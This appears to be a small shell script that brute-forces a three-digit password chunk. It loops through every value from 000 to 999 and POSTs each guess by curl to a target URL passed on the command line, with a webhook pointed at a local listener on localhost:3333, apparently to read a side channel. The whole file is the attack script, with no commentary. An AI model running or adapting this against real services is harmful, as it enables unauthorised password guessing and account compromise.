#!/bin/sh

date

for I in $(seq 0 999); do
    NUMBER=`printf '%03i' $I`
    echo "Checking chunk $NUMBER"
    curl $1 -d "{\"password\": \"$NUMBER\", \"webhooks\": [\"localhost:3333\"]}"
done

date
